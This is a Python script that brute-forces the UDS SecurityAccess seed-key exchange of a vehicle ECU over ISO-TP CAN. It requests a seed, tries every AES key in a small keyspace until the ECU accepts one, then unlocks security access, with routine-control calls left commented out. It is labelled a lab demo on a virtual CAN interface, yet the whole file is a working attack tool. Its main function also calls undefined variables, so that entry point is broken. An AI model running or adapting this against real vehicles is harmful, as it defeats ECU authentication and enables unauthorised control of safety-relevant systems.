import os
import time
import secrets
import udsoncan
import isotp
from udsoncan.connections import IsoTPSocketConnection
from udsoncan.client import Client
from udsoncan.exceptions import *
from udsoncan.services import *
from udsoncan import DidCodec

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Signature import pss
from Crypto.Hash import SHA256
from typing import Optional
import statistics

class UDSTester:
    def __init__(self, connection):
        udsoncan.setup_logging()
        self.client_config = {
            'security_algo': self.security_algorithm_bruteforce_aes,
            'exception_on_negative_response': False,
            'exception_on_invalid_response': True,
            'security_level': 3
        }
        self.connection = connection
        self.found_key = None
        self._rsa_privkey = None
    def unlock_security_access(self, client):
        client.unlock_security_access(self.client_config['security_level'])    
    def security_algorithm_bruteforce_aes(self, seed: bytes) -> bytes:
        """Called by udsoncan with keyword arg 'seed'. Returns bytes to send as Key."""
        if not self.found_key:
            raise RuntimeError("No found_key stored — brute force must run first.")
        if len(self.found_key) != 16:
            raise RuntimeError("found_key must be 16 bytes for AES-ECB demo")
        cipher = AES.new(self.found_key, AES.MODE_ECB)
        return cipher.encrypt(seed)
    def test_routine_control1(self, client):
        routine_id_01A1 = 0x01A9
        control_type_start = udsoncan.services.RoutineControl.ControlType.startRoutine
        control_type_stop = udsoncan.services.RoutineControl.ControlType.stopRoutine
        datacontrol_01A1 = b'\x64'
        response_01A1 = client.routine_control(routine_id_01A1, control_type_start, datacontrol_01A1)
        #time.sleep(2)
        #response_01A1 = client.routine_control(routine_id_01A1, control_type_stop, datacontrol_01A1)

        #response_01A1 = client.routine_control(routine_id_01A1, control_type_stop)

# Put this near top of file (if estimate_bruteforce_feasibility isn't already defined)
def _calibrate_attempt_rate(sock, seed, key_subfunc, sample_count=100):
    """
    Send `sample_count` quick candidate frames (same candidate every time)
    and measure median per-attempt RTT (ms). Returns attempts_per_second (float).
    Note: uses the provided socket (already bound).
    """
    import statistics, time
    sample_rtts = []
    # Build a dummy candidate that won't unlock (safe): use zero key -> deterministic payload
    dummy_key = (0).to_bytes(16, "big")
    from Crypto.Cipher import AES
    cipher = AES.new(dummy_key, AES.MODE_ECB)
    dummy_payload = cipher.encrypt(seed)
    frame = bytes([0x27, key_subfunc]) + dummy_payload

    for _ in range(sample_count):
        t0 = time.perf_counter_ns()
        try:
            sock.send(frame)
            _ = sock.recv()  # may block until response/timeout
            t1 = time.perf_counter_ns()
        except Exception:
            t1 = time.perf_counter_ns()
        rtt_ms = (t1 - t0) / 1_000_000.0
        sample_rtts.append(max(rtt_ms, 0.0001))  # avoid zeros

    med_ms = statistics.median(sample_rtts)
    attempts_per_second = 1000.0 / med_ms if med_ms > 0 else float("inf")
    print(f"[CALIBRATE] median per-attempt RTT = {med_ms:.3f} ms -> approx {attempts_per_second:.1f} attempts/s")
    return attempts_per_second, med_ms
    

def brute_force_aes_on_bus(interface="vcan0",
                           txid=0x7E0, rxid=0x7E8,
                           seed_subfunc=0x03, key_subfunc=0x04,
                           keyspace_bits=16, try_sleep=0.0,
                           log_every: Optional[int] = 1000,
                           calibrate: bool = False):
    """
    Request seed, brute-force small AES keyspace, return found key bytes (16) or raise.
    keyspace_bits: use small value like 16 for demo (65536 candidates).
    make_key_from_candidate expands a small integer to 16-byte AES key (lab only).
    log_every: print progress every `log_every` candidates (None or 0 to disable).
    calibrate: if True, attempt to run a short calibration to estimate attempts/sec
               using the _calibrate_attempt_rate helper (best-effort).
    """
    # helper expand candidate -> 16-byte key (lab pattern)
    def make_key_from_candidate(c):
        # 16-byte key from small candidate: two-byte value repeated 8 times
        b = c.to_bytes(2, "big")
        return b * 8

    KEYSPACE_MAX = 1 << keyspace_bits

    # Create isotp socket and bind
    s = isotp.socket()
    s.set_fc_opts(stmin=5, bs=8)
    s.bind(interface, isotp.Address(rxid=rxid, txid=txid))

    per_attempt_rtts = []
    total_t0 = time.perf_counter_ns()

    try:
        # optional calibration (best-effort)
        if calibrate:
            try:
                # reuse socket and seed to estimate attempts/sec; send a proper seed request
                seed_request = bytes([0x27, seed_subfunc])
                # Ask ECU for seed so we can calibrate RTT using real seed bytes
                s.send(seed_request)
                seed_resp = s.recv()
                if seed_resp and len(seed_resp) >= 3 and seed_resp[0] == 0x67 and seed_resp[1] == seed_subfunc:
                    seed = bytes(seed_resp[2:])
                    attempts_per_second, med_ms = _calibrate_attempt_rate(s, seed, key_subfunc, sample_count=50)
                    print(f"[CALIBRATE] approx {attempts_per_second:.1f} attempts/s (median RTT {med_ms:.3f} ms)")
                else:
                    print("[CALIBRATE] couldn't calibrate: no valid seed response")
                    # fall through to normal seed request below
            except Exception as e:
                print(f"[CALIBRATE] calibration failed: {e}")

        # 1) request seed (measure seed RTT) - if not already set by calibrate
        seed_request = bytes([0x27, seed_subfunc])
        t_req0 = time.perf_counter_ns()
        s.send(seed_request)
        seed_resp = s.recv()
        t_req1 = time.perf_counter_ns()

        seed_rtt_ms = (t_req1 - t_req0) / 1_000_000.0

        if not seed_resp or len(seed_resp) < 2 or seed_resp[0] != 0x67 or seed_resp[1] != seed_subfunc:
            raise RuntimeError(f"No valid seed response (got: {seed_resp})")
        seed = bytes(seed_resp[2:])
        if len(seed) != 16:
            raise RuntimeError(f"Unexpected seed length: {len(seed)}")

        # 2) brute-force loop with per-attempt timing
        for cand in range(KEYSPACE_MAX):
            key = make_key_from_candidate(cand)
            cipher = AES.new(key, AES.MODE_ECB)
            candidate_payload = cipher.encrypt(seed)
            frame = bytes([0x27, key_subfunc]) + candidate_payload

            t0 = time.perf_counter_ns()
            s.send(frame)
            # wait short for response
            try:
                r = s.recv()
                t1 = time.perf_counter_ns()
                rtt_ms = (t1 - t0) / 1_000_000.0
            except Exception:
                r = None
                t1 = time.perf_counter_ns()
                rtt_ms = (t1 - t0) / 1_000_000.0  # measured time until timeout/exception

            per_attempt_rtts.append(rtt_ms)

            # check positive response (ECU unlocked/accepted key)
            if r and len(r) >= 2 and r[0] == 0x67 and r[1] == key_subfunc:
                total_t1 = time.perf_counter_ns()
                elapsed_ms = (total_t1 - total_t0) / 1_000_000.0
                # timing stats (guard against empty list)
                median_ms = statistics.median(per_attempt_rtts) if per_attempt_rtts else 0.0
                mean_ms = statistics.mean(per_attempt_rtts) if per_attempt_rtts else 0.0
                stats = {
                    "attempts": cand + 1,
                    "elapsed_ms": elapsed_ms,
                    "seed_rtt_ms": seed_rtt_ms,
                    "per_attempt_median_ms": median_ms,
                    "per_attempt_mean_ms": mean_ms,
                    "per_attempt_min_ms": min(per_attempt_rtts) if per_attempt_rtts else 0.0,
                    "per_attempt_max_ms": max(per_attempt_rtts) if per_attempt_rtts else 0.0
                }
                print(f"[BRUTE] Found candidate key id=0x{cand:04x}  (elapsed {elapsed_ms:.3f} ms)")
                print(f"[BRUTE TIMING] {stats}")
                return key

            # optional progress logging
            if log_every and log_every > 0 and ((cand + 1) % log_every == 0):
                med = statistics.median(per_attempt_rtts) if per_attempt_rtts else 0.0
                last_rtt = rtt_ms if per_attempt_rtts else 0.0
                print(f"[BRUTE] tried {cand+1}/{KEYSPACE_MAX} candidates — last rtt={last_rtt:.3f} ms, median rtt={med:.3f} ms")

            if try_sleep:
                time.sleep(try_sleep)

        # not found
        total_t1 = time.perf_counter_ns()
        elapsed_ms = (total_t1 - total_t0) / 1_000_000.0
        print(f"[BRUTE] Exhausted {KEYSPACE_MAX} candidates in {elapsed_ms:.3f} ms")
        if per_attempt_rtts:
            print(f"[BRUTE TIMING] attempts={len(per_attempt_rtts)}, median={statistics.median(per_attempt_rtts):.3f} ms, mean={statistics.mean(per_attempt_rtts):.3f} ms, min={min(per_attempt_rtts):.3f} ms, max={max(per_attempt_rtts):.3f} ms")
        raise RuntimeError("Bruteforce failed (increase KEYSPACE or adjust params)")
    finally:
        try:
            s.close()
        except:
            pass

# --- end replacement ---


def main():
    attempts_per_sec, med_ms = _calibrate_attempt_rate(some_socket, seed_bytes, key_subfunc, sample_count=50)
    estimated_seconds = (1 << keyspace_bits) / attempts_per_sec
    print(f"Estimated time to test full keyspace: {estimated_seconds/60:.1f} minutes")
    try:
        print("Requesting seed and running brute-force (lab demo)...")
        # pass log_every (how often to print progress), calibrate=True will try to estimate attempts/s
        found_key = brute_force_aes_on_bus(interface="vcan0",
                                           txid=0x7E0, rxid=0x7E8,
                                           seed_subfunc=0x03, key_subfunc=0x04,
                                           keyspace_bits=16, try_sleep=0.0,
                                           log_every=1024,
                                           calibrate=False)
        print("Brute-force complete. Found AES key (hex):", found_key.hex())
    except Exception as e:
        print("Brute-force failed or aborted:", e)
        return   
    
    with IsoTPSocketConnection(interface='vcan0', rxid=0x7E8, txid=0x7E0, tpsock=isotp.socket()) as connection:
        connection.open()
        uds_tester = UDSTester(connection)
        uds_tester.found_key = found_key
        
        with Client(connection, request_timeout=10, config=uds_tester.client_config) as client:
            try:
                uds_tester.unlock_security_access(client)  
                #uds_tester.test_routine_control1(client)                 
            except NegativeResponseException as e:
                print(f'Server refused our request for service {e.response.service.get_name()} with code "{e.response.code_name}" (0x{e.response.code:02x})')
            except InvalidResponseException as e:
                print(f'Server sent an invalid payload: {e.response.original_payload}')
            except UnexpectedResponseException as e:
                print(f'Unexpected response from server: {e.response.original_payload}')

if __name__ == "__main__":
 main()